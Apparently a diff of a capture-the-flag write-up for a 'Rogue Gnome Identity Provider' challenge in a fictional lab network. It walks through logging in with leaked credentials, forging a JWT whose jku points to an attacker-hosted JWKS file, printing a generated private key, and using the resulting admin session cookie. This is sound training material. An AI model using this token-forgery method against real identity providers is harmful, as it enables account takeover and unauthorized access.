@@ -13,7 +13,7 @@ title: act2_rogue_gnome_identity_provider_mjd
 
 The attack begins by using exposed gnome credentials (gnome:SittingOnAShelf) to authenticate against the Identity Provider (IDP). This login returns a JSON Web Token (JWT), which is then analyzed. By exploiting weaknesses in JWT validation, the attacker modifies critical claims: changing the subject (sub) from gnome to santa, flipping the admin flag from false to true, and redirecting the jku field to a malicious JWKS file hosted on their own server.
 
-To support the attack, the attacker generates a fraudulent RSA key pair and publishes the public key in their rogue JWKS file, while signing the tampered token with the private key. The manipulated token is then passed to the target service, which incorrectly validates it against the attacker-controlled JWKS endpoint. This grants unauthorized access and a valid session cookie. Finally, the attacker uses the session to connect to the diagnostic interface, retrieving sensitive data — in this case, the file refrigeration-botnet.bin.
+To support the attack, the attacker generates a fraudulent RSA key pair and publishes the public key in their rogue JWKS file, while signing the tampered token with the private key. The manipulated token is then passed to the target service, which incorrectly validates it against the attacker-controlled JWKS endpoint. This grants unauthorized access and a valid session cookie. Finally, the attacker uses the session to connect to the diagnostic interface, retrieving sensitive data - in this case, the file refrigeration-botnet.bin.
 
 | Activity                                      | Primary Tactic        | MITRE ATT&CK Technique ID | MITRE ATT&CK Technique Name                  |
 |-----------------------------------------------|-----------------------|---------------------------|----------------------------------------------|
@@ -27,7 +27,7 @@ To support the attack, the attacker generates a fraudulent RSA key pair and publ
 ## Detailed Solution
 <details>
 <summary>Click to expand</summary>
-URL: 
+URL:
 
 http://paulweb.neighborhood/
 
@@ -37,7 +37,7 @@ Useful resources for understading how JSON Web Tokens work:
 https://github.com/ticarpi/jwt_tool/wiki
 
 https://portswigger.net/web-security/jwt
- 
+
 The notes.txt file contains some useful commands and a set of credentials:
 ```
 # Credentials
@@ -64,7 +64,7 @@ curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnost
 
 ## Analyze the JWT
 jwt_tool.py <insert-JWT>
-``` 
+```
 
 Using the authenticate curl command from the notes combined with the credentials to login:
 
@@ -77,17 +77,17 @@ paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAS
 <p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg</a>. If not, click the link.
 ```
 The response includes a token:
-```  
+```
 eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg
 ```
 
 Using JWT.IO to decode the token:
 
-![Decoding the token](/images/roguegnomeidp_jwt.jpg) 
- 
+![Decoding the token](/images/roguegnomeidp_jwt.jpg)
+
 Lets look at the contents of the jwks.json file:
 ```
-</html>paul@paulweb:~$ curl -v http://idp.atnascorp/.well-known/jwks.json 
+</html>paul@paulweb:~$ curl -v http://idp.atnascorp/.well-known/jwks.json
 * Host idp.atnascorp:80 was resolved.
 * IPv6: (none)
 * IPv4: 127.0.0.1
@@ -97,13 +97,13 @@ Lets look at the contents of the jwks.json file:
 > Host: idp.atnascorp
 > User-Agent: curl/8.5.0
 > Accept: */*
-> 
+>
 < HTTP/1.1 200 OK
 < Date: Mon, 10 Nov 2025 16:40:39 GMT
 < Server: Werkzeug/3.0.1 Python/3.12.3
 < Content-Type: application/json
 < Content-Length: 476
-< 
+<
 {
   "keys": [
     {
@@ -119,13 +119,13 @@ Lets look at the contents of the jwks.json file:
 
 The /etc/passwd file is accessible. The username "santa" looks like a good one to use in the attack.
 
-![Contents of the Password file](/images/roguegnomeidp_passwdfile.jpg) 
- 
+![Contents of the Password file](/images/roguegnomeidp_passwdfile.jpg)
+
 Using mkjwk - JSON Web Key Generator, generate the json web key:
 
-![Generating JSON Web Key](/images/roguegnomeidp_keys.jpg) 
+![Generating JSON Web Key](/images/roguegnomeidp_keys.jpg)
 
-``` 
+```
 e: AQAB
 n: hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w
 
@@ -167,7 +167,7 @@ ZLIvv1aKy12DwMKO7SS6WVtU3ZKVBFisj/smKJs83UTkoRUjjVrKggmUTEh9Tgcl
 o3/VIQKBgHX31e9bbXhE9djtorJYbtooc9zuP0ORKFGJWTSCoj6Y/HxetewZHV2S
 +bWGuBTkTb4b9jHhUOcyBJpuuWtfnFg+db7mTnez1wsQffcde5BHcn8KUSbGrnIR
 9UjGRQC4CNPXlEmAQ9PA9l06g/J4iJx6NYCGhW0GaxxUiE9mqRN3
------END RSA PRIVATE KEY----- 
+-----END RSA PRIVATE KEY-----
 -----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhJwH0hvuZC3HVpQocwmk
 76t8wQQOXWETMHnRuP/GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg
@@ -188,7 +188,7 @@ Using JWT.io change the minimal number of items. The hint says gnome has insuffi
 
 The token is signed using the Private key generated. The public key and the fraudulent JWKS file is placed in the www directory of paulweb.neighborhood.
 
-![Creating a Tampered Token](/images/roguegnomeidp_tamperedjwt.jpg)  
+![Creating a Tampered Token](/images/roguegnomeidp_tamperedjwt.jpg)
 
 Tampered token:
 ```
@@ -202,7 +202,7 @@ The session key is used to connect to the diagntic interface:
 ```
 curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJzYW50YSJ9.aRJ4Fw.oA20V3TpQ5ST2sky_K3XDsllPSs; ' http://gnome-48371.atnascorp/diagnostic-interface
 ```
-![Getting the Diagnostic Interface](/images/roguegnomeidp_diagnostic.jpg)   
+![Getting the Diagnostic Interface](/images/roguegnomeidp_diagnostic.jpg)
 
 **Answer:refrigeration-botnet.bin**
 
@@ -212,9 +212,9 @@ curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJzYW50YSJ9.aRJ4Fw.oA2
 
 | Tools Used           | Tool Version |
 | :-----------------------: | :--------------------------------: |
-| curl | 8.11.0  | 
+| curl | 8.11.0  |
 | [JSON Web Token (JWT) Debugger](https://JWT.IO) | N/A |
-| [JWK to PEM Converter](https://8gwifi.org/jwkconvertfunctions.jsp) | N/A  | 
+| [JWK to PEM Converter](https://8gwifi.org/jwkconvertfunctions.jsp) | N/A  |
 | [JSON Web Key generator](https://mkjwk.org/) | N/A  |
 
 ## Hints Reference
